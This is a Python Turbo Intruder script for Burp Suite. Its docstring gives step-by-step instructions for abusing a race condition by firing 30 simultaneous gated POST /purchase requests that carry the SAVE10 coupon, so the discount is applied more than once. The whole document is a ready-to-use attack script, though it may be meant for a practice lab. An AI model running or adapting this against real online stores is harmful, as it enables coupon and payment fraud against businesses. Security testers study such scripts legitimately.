"""
Turbo Intruder Script for Race Condition Coupon Abuse
=====================================================

Instructions:
1. Add items to your cart in the browser
2. Apply the SAVE10 coupon (you should see 10% discount)
3. On the checkout page, open Burp Suite
4. Intercept the final PURCHASE request (POST /purchase) - NOT /apply_coupon
5. Right-click the /purchase request → Extensions → Turbo Intruder → Send to turbo intruder
6. Replace the default script with this code
7. Click "Attack" to exploit the race condition

IMPORTANT: You need the POST /purchase request, not /apply_coupon!
The request should look like:
POST /purchase HTTP/1.1
...
coupon_code=SAVE10
"""

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
